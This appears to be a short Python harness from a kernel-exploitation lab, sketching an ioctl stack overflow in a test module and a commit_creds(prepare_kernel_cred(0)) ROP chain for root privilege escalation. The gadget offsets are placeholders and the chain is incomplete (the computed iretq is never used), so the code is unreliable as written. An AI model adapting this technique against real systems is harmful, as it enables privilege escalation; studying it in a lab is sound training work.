#!/usr/bin/env python3
"""Userland harness to analyze the kernel-rop ioctl interface.
The real exploit runs on a vulnerable kernel module (vuln_module.c).
This harness simulates the ioctl contract so you can prototype the ROP chain.
"""
import ctypes, struct

# In the real target: fd = open('/proc/kerntest'); ioctl(fd, 0x1337, payload)
# payload overflows a 64-byte kernel stack buffer -> overwrite return address
# with a kernel ROP chain: prepare_kernel_cred(0) -> commit_creds -> iret

def build_rop_chain(kernel_base):
    # Gadget offsets would be resolved from /proc/kallsyms in the real exploit
    prepare_kernel_cred = kernel_base + 0x123456
    commit_creds = kernel_base + 0x123abc
    iretq = kernel_base + 0x9abcdef
    chain = struct.pack('<Q', prepare_kernel_cred)
    chain += struct.pack('<Q', 0)  # arg 0
    chain += struct.pack('<Q', commit_creds)
    return chain

if __name__ == '__main__':
    print("Build a kernel ROP chain to call commit_creds(prepare_kernel_cred(0)).")
    print("Then iret back to userland shell. Provide kernel_base from kallsyms.")
